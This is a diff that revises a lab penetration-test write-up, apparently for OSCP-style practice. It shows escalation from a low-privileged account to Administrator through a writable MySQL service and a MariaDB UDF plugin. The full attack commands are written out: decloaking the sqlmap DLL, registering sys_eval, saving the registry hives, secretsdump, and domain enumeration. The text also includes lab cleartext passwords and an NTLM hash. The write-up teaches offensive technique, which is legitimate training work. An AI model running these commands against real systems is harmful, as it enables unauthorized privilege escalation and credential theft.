@@ -192,110 +192,86 @@ We got a shell as the local user **`era\apache`** — a low-privileged local acc
 
 ### 7.1 Enumeration with PrivescCheck
 
-Now we are `era\apache` — a low-privileged user — so the goal is to find a way to run code as a higher-privileged account. We used two enumerators: **WinPEAS** (broad) and **PrivescCheck** (itm4n, cleaner output):
+Now we are `era\apache` — a normal, low-level user. We need to find a way to run code as a more powerful account. Two tools help with that: **WinPEAS** and **PrivescCheck**.
 
 ```powershell
 upload /home/kali/tools/PrivescCheck.ps1
 Get-Content .\PrivescCheck.ps1 -Raw | Invoke-Expression; Invoke-PrivescCheck -Extended
 ```
 
-*(PrivescCheck comes from its release page — `https://github.com/itm4n/PrivescCheck/releases/latest/download/PrivescCheck.ps1` — and we dot-load it via `Invoke-Expression` to get around the PowerShell execution policy.)*
+*(PrivescCheck comes from `https://github.com/itm4n/PrivescCheck/releases/latest/download/PrivescCheck.ps1`.)*
 
-The biggest finding was in the `Services - Image File Permissions` check, explained next.
+The most important thing it found was about a service called **MySQL** — explained below.
 
 ### 7.2 The Finding — MySQL Service Runs as Administrator
 
-**Concept.** A Windows service is a background program that runs on its own, and each service runs *as* a specific account (SYSTEM, a local admin, and so on). If a service runs as a privileged account **and** a low-privileged user can edit its executable, that user can swap the executable for their own and let the service run it as the privileged account. That is the classic *writable-service-binary* privesc.
+A Windows service is a program that runs quietly in the background. Each service runs as a specific account — sometimes a normal user, sometimes SYSTEM or Administrator.
 
-**Analogy.** Think of a Windows service as a courier with a permanent *all-access pass* to the Administrator-only area — the pass belongs to the courier, not the parcel. Every day the courier carries a fixed parcel (the service's own executable, `mysqld.exe`). If we swap that parcel for our own (because the executable is left writable), the courier will still walk through the Administrator-only door and deliver *our* parcel — because the pass doesn't care what's inside, only who's carrying it.
+If a service runs as Administrator, **and** a normal user can edit its program file, then that user can swap the file for their own. When the service runs, it launches their file — with Administrator's power.
 
-PrivescCheck flagged two service binaries as **writable by `NT AUTHORITY\Authenticated Users`** (a group that includes every logged-in user, including `apache`):
+**Analogy.** Think of a Windows service as a courier with a permanent *all-access pass* to the Administrator-only area. The pass belongs to the courier, not the parcel. Every day the courier carries a fixed parcel (the service's own program, `mysqld.exe`). If we swap the parcel for our own (because the program is left writable), the courier still walks through the Administrator-only door and delivers *our* parcel — the pass doesn't care what's inside, only who is carrying it.
 
-| Service        | Image Path                      | Runs As           | Useful?                    |
-| -------------- | ------------------------------- | ----------------- | -------------------------- |
-| `ApacheServer` | `C:\xampp\apache\bin\httpd.exe` | `.\apache`        | No — already our own user  |
-| `MySQL`        | `C:\xampp\mysql\bin\mysqld.exe` | `.\Administrator` | **Yes** — higher privilege |
+PrivescCheck found two services whose program files we could edit:
 
-The `ApacheServer` service is useless to us — it already runs as `apache`, so swapping its binary changes nothing. The **`MySQL`** service is the target: its binary `C:\xampp\mysql\bin\mysqld.exe` is writable by `Authenticated Users`, **and** the service runs as the **local `Administrator`** account. Swap that binary and let the service run it, and we get code execution as `Administrator`.
+| Service        | Program file                    | Runs as           | Useful?                  |
+| -------------- | ------------------------------- | ----------------- | ------------------------ |
+| `ApacheServer` | `C:\xampp\apache\bin\httpd.exe` | `.\apache`        | No — already our user    |
+| `MySQL`        | `C:\xampp\mysql\bin\mysqld.exe` | `.\Administrator` | **Yes**                  |
 
-We tried the direct way first. Replacing the binary failed because the service was running, which locks its executable:
+`ApacheServer` is useless — it already runs as `apache`, our own user. `MySQL` is the target: its program runs as **Administrator**, and we can write to it.
+
+We tried swapping the file, but it was locked (the service was running):
 
 ```powershell
 copy .\mysqld.exe C:\xampp\mysql\bin\mysqld.exe
-# The process cannot access the file ... because it is being used by another process.
+# The process cannot access the file ... it is being used by another process.
 ```
 
-To load a replaced binary, we would need to restart the service — but we couldn't:
-
-- `net stop MySQL` → `System error 5` (the service ACL doesn't give `apache` permission to stop it).
-- `shutdown /r /t 0` → `Access is denied` (a WinRM session can't reboot even with `SeShutdownPrivilege`).
-
-So the "swap the binary" path was blocked. We used the database's own features instead — the MariaDB UDF trick.
+We also couldn't restart the service (`net stop MySQL` → access denied) or reboot (`shutdown /r` → access denied over WinRM). So we took a different route — the database itself.
 
 ### 7.3 The Pivot — MariaDB User-Defined Function (UDF)
 
-**The idea in one sentence.** The `MySQL` service runs as `.\Administrator`, so the database process (`mysqld.exe`) already has Administrator power. A *User-Defined Function* (UDF) is how we borrow that power: it lets us teach the database a new SQL function that runs OS commands — and those commands run **as Administrator**, not as `apache`.
+The database program (`mysqld.exe`) already runs as Administrator. So if we can make the database run a command for us, that command runs as Administrator.
 
-**What is a UDF, exactly?** A database only understands a fixed set of built-in commands (`SELECT`, `COUNT`, `LENGTH`, and so on). A UDF is a way to install a *plugin* — a compiled shared library (a `.dll` file on Windows) — that adds a brand-new function the database didn't have before. Once installed, you call it just like any built-in function. It's a documented, legitimate MariaDB feature: see [CREATE FUNCTION (UDF)](https://mariadb.com/docs/server/server-usage/user-defined-functions/create-function-udf) and the [User-Defined Functions overview](https://mariadb.com/docs/server/server-usage/user-defined-functions).
+MariaDB has a feature for this: **UDF (User-Defined Function)**. The idea is simple — we install a small plugin (a `.dll` file) that teaches the database a new function called `sys_eval`. Then calling `sys_eval('whoami')` makes the database run `whoami` and give us the result.
 
-**Analogy.** Think of the database as a butler who only knows a fixed list of tasks (`SELECT`, `COUNT`, and so on). A UDF is like handing the butler a new instruction card (the `.dll`) that teaches him one extra task — *"when you hear `sys_eval('whoami')`, go run the `whoami` command and bring back the result."* Because the butler works inside the boss's office (the database runs as Administrator), anything he runs carries the boss's authority, not yours.
+**Analogy.** Think of the database as a butler who only knows a fixed list of tasks. A UDF is a new instruction card (the `.dll`) we hand the butler, teaching him one extra task — *"when you hear `sys_eval('whoami')`, go run `whoami` and bring back the result."* Because the butler works in the boss's office (the database runs as Administrator), anything he runs carries the boss's authority.
 
-The library we want — `lib_mysqludf_sys` — adds a function called `sys_eval`. `sys_eval('whoami')` makes the database run the OS command `whoami` and hand back the output. Because the database is the `MySQL` service running as `.\Administrator`, that `whoami` runs as Administrator. The library and its full function list are documented at <https://github.com/mysqludf/lib_mysqludf_sys>.
+Five things had to line up — and they all did here:
 
-**The plan, step by step.** Five things have to line up for this to work. Each one is checked below against this environment.
-
-**Step 1 — Database admin access.** To install a UDF you need to run `CREATE FUNCTION`, which needs database admin. The local MariaDB accepted `root` with an **empty password** — the default that ships with XAMPP and was never changed. That gives us full database admin.
-
-**Step 2 — The server must be allowed to write files.** Installing a UDF means dropping our `.dll` onto the target, so the database needs permission to write files. That's controlled by `@@secure_file_priv`:
-
-- `secure_file_priv` set to a **path** → the server may only write inside that path.
-- `secure_file_priv` set to **empty / NULL** → the server may write **anywhere** (no restriction).
-
-**Step 3 — Find the plugin directory.** A UDF library only loads from one specific folder — the "plugin directory", reported by `@@plugin_dir`. Our `.dll` must land there.
-
-**Step 4 — Get a UDF library that runs OS commands.** `lib_mysqludf_sys` (see "What is a UDF" above) gives us `sys_eval` (returns output) and `sys_exec` (returns exit code). We took it from the sqlmap distribution on our machine.
-
-**Step 5 — Get the DLL into the plugin directory.** This is the fiddly part, with two snags:
-
-- *The DLL is "cloaked".* sqlmap stores its UDF files **cloaked** — XOR-encrypted and zlib-compressed — so the file sitting in sqlmap's data folder is *not* a valid DLL (it has no `MZ` header). We have to "decloak" it first with sqlmap's own tool:
+1. **Admin access to the database.** We connected as `root` with no password (XAMPP's default, never changed).
+2. **The database can write files.** `secure_file_priv` was empty, so it can write anywhere.
+3. **Find the plugin folder.** `plugin_dir` told us where the `.dll` must go.
+4. **Get the plugin.** We used `lib_mysqludf_sys.dll` from sqlmap. It's stored "cloaked" (encrypted), so we uncloaked it first:
 
 ```bash
 python3 /usr/share/sqlmap/extra/cloak/cloak.py -d -i /usr/share/sqlmap/data/udf/mysql/windows/64/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys.dll
 ```
 
-The result was a valid 64-bit Windows DLL (`PE32+ ... x86-64`).
-
-- *The plugin folder didn't exist yet.* `@@plugin_dir` said `C:\xampp\mysql\lib\plugin\`, but that folder wasn't actually on disk (MariaDB reports its default even before the folder is created). We created it first — and because `apache` created it, `apache` owns it and can copy straight into it:
+5. **Put the `.dll` in place and register it.** The plugin folder didn't exist yet, so we created it, copied the file in, and registered the function:
 
 ```powershell
 mkdir C:\xampp\mysql\lib\plugin
 upload /home/kali/oscp/secura/lib_mysqludf_sys.dll
 copy .\lib_mysqludf_sys.dll C:\xampp\mysql\lib\plugin\lib_mysqludf_sys.dll
-```
-
-**Step 6 — Register and use the function.** With the DLL in place, one SQL line installs it:
-
-```powershell
 C:\xampp\mysql\bin\mysql.exe -u root -e "CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys.dll';"
 ```
 
-`CREATE FUNCTION ... SONAME` means: *"register a SQL function named `sys_eval`, returning a string, backed by the `sys_eval` symbol inside `lib_mysqludf_sys.dll`."* (The `SONAME` clause is the UDF form of `CREATE FUNCTION`; the exact grammar is in the MariaDB docs linked above.)
-
-**Why this is escalation (recap).** The `whoami` that `sys_eval` runs executes *inside* `mysqld.exe`. That process is the `MySQL` service, which runs as `.\Administrator`. So while our own shell is only `apache`, anything the database runs for us runs as `Administrator` — confirmed in the next section.
+That last line registers `sys_eval` as a SQL function. It's ready to use.
 
 **Further reading.**
 
-- MariaDB — [CREATE FUNCTION (UDF)](https://mariadb.com/docs/server/server-usage/user-defined-functions/create-function-udf) and [User-Defined Functions](https://mariadb.com/docs/server/server-usage/user-defined-functions) (official reference).
-- MariaDB — [User-Defined Functions Security](https://mariadb.com/docs/server/server-usage/user-defined-functions/user-defined-functions-security) (plugin-dir placement + required privileges).
+- MariaDB — [CREATE FUNCTION (UDF)](https://mariadb.com/docs/server/server-usage/user-defined-functions/create-function-udf) and [User-Defined Functions](https://mariadb.com/docs/server/server-usage/user-defined-functions).
+- MariaDB — [User-Defined Functions Security](https://mariadb.com/docs/server/server-usage/user-defined-functions/user-defined-functions-security).
 - HackTricks — [MySQL / MariaDB Privilege Escalation (UDF)](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mysql/index.html).
-- `lib_mysqludf_sys` — [project page / function reference](https://github.com/mysqludf/lib_mysqludf_sys).
-- sqlmap — [UDF files and the `cloak.py` utility](https://github.com/sqlmapproject/sqlmap).
+- `lib_mysqludf_sys` — [project page](https://github.com/mysqludf/lib_mysqludf_sys).
+- sqlmap — [UDF files + `cloak.py`](https://github.com/sqlmapproject/sqlmap).
 - MySQL UDF Exploitation cheat sheet — [koparmalbaris/MySQL-UDF-Exploitation](https://github.com/koparmalbaris/MySQL-UDF-Exploitation).
 - HackIndex — [MySQL UDF Privilege Escalation](https://hackindex.io/services/mysql/exploitation/mysql-udf-privilege-escalation).
 
 ### 7.4 Executing Commands as Administrator
 
-**Concept.** We now have a SQL function that can run any OS command. Calling `sys_eval` executes that command inside `mysqld.exe` — the MySQL service — which runs as `.\Administrator`:
+Now we just call `sys_eval` from SQL. It runs inside `mysqld.exe`, which is Administrator:
 
 ```powershell
 C:\xampp\mysql\bin\mysql.exe -u root -e "SELECT sys_eval('whoami');"
@@ -306,7 +282,7 @@ sys_eval('whoami')
 era\administrator
 ```
 
-The output `era\administrator` proves that our commands now run as the local Administrator. That's **privilege escalation from `era\apache` to `era\Administrator`** on the ERA host.
+`era\administrator` — we went from `apache` to **Administrator**.
 
 ---
 
@@ -314,11 +290,11 @@ The output `era\administrator` proves that our commands now run as the local Adm
 
 ### 8.1 Credential Dumping with secretsdump
 
-**Concept.** Now that we are Administrator, the next goal is to collect credentials that help us reach the Domain Controller. A Windows box stores secrets in a few places — the SAM holds local account hashes, and LSA keeps service-account passwords in a reversible form. We dump these.
+Now that we are Administrator, the next goal is to collect credentials to reach the Domain Controller. Windows keeps secrets in a few places — the SAM (local account hashes) and LSA (service-account passwords, stored in a readable form).
 
-**Analogy.** Think of the box as a locked drawer full of spare keys. As Administrator we hold the master key, so we open the drawer and copy out the spare keys — including one we didn't have before (`Almost4There8.?`).
+**Analogy.** Think of the box as a locked drawer of spare keys. As Administrator, we hold the master key, so we open the drawer and copy out the spare keys.
 
-With a reverse shell as `era\Administrator`, we pulled the local credential stores. We saved the `SAM`, `SYSTEM` and `SECURITY` registry hives and parsed them offline with impacket's `secretsdump.py`:
+We saved the `SAM`, `SYSTEM` and `SECURITY` hives and parsed them offline:
 
 ```powershell
 reg save HKLM\SAM C:\Users\apache.ERA\Documents\sam.hiv
@@ -332,30 +308,23 @@ impacket-secretsdump -sam sam.hiv -system system.hiv -security security.hiv LOCA
 
 Two useful things came out:
 
-- **The Administrator password in cleartext** — `Almost4There8.?` — from the `_SC_MySQL` LSA secret. Because the `MySQL` service runs as `.\Administrator`, its service-account password is stored (reversibly) in LSA, and we can read it.
-- **The local `Administrator` NTLM hash** — `faf613cedb73980bbd34e0a5514df813`.
-
-Relevant `secretsdump.py` output:
+- **The Administrator password in cleartext** — `Almost4There8.?` — from the `_SC_MySQL` LSA secret (MySQL runs as Administrator, so its password is stored in a readable form).
+- **The Administrator NTLM hash** — `faf613cedb73980bbd34e0a5514df813`.
 
 ```
-[*] Dumping LSA Secrets
-[*] _SC_ApacheServer
-(Unknown User):New2Era4.!
-[*] _SC_cloudbase-init
-(Unknown User):IRoDjQ8JghcHUlQCX4UK
 [*] _SC_MySQL
 (Unknown User):Almost4There8.?
 ```
 
-There were no cached domain logon credentials on ERA.
+No cached domain logins on ERA.
 
 ### 8.2 Domain Enumeration with adscan
 
-**Concept.** With credentials in hand, the next step is to map the Active Directory environment — who has which permissions, and where the paths to Domain Admin are. This is *domain enumeration*. Here we used our own tool `adscan` to query the Domain Controller.
+Next we map the domain — who has what permissions, and where the paths to Domain Admin are.
 
-**Analogy.** It's like drawing the map of a building before choosing which door to break down — enumeration shows us the doors, and who holds the keys to each one.
+**Analogy.** It's like drawing the map of a building before choosing which door to break down.
 
-We enumerated the `secura.yzx` domain against the Domain Controller (`dc01.secura.yzx`) using `adscan` with the starting account `Eric.Wallows`:
+We used our own tool `adscan`:
 
 ```bash
 adscan scan --domain secura.yzx --dc-ip 192.168.216.97 --username Eric.Wallows --password 'EricLikesRunning800' --mode full -o reports/
@@ -363,10 +332,10 @@ adscan scan --domain secura.yzx --dc-ip 192.168.216.97 --username Eric.Wallows -
 
 Key findings:
 
-- **Zerologon (CVE-2020-1472)** — possible exposure on `DC01` (Windows Server 2016 Standard).
-- **`Admin` is a member of `Administrators`** — a nested path to `Domain Admins`, useful if we can get that account's credentials.
-- **Group Policy Preferences (cpassword)** in SYSVOL — a possible lead for cleartext credentials.
-- **SMB/LDAP signing disabled** and **`MachineAccountQuota = 10`** (an RBCD prerequisite). No AD CS.
+- **Zerologon (CVE-2020-1472)** — possible exposure on `DC01`.
+- **`Admin` is a member of `Administrators`** — a path to Domain Admins if we get that account's password.
+- **GPP (cpassword)** in SYSVOL — possible cleartext credentials.
+- **SMB/LDAP signing disabled** and **`MachineAccountQuota = 10`**. No AD CS.
 
 ---
 
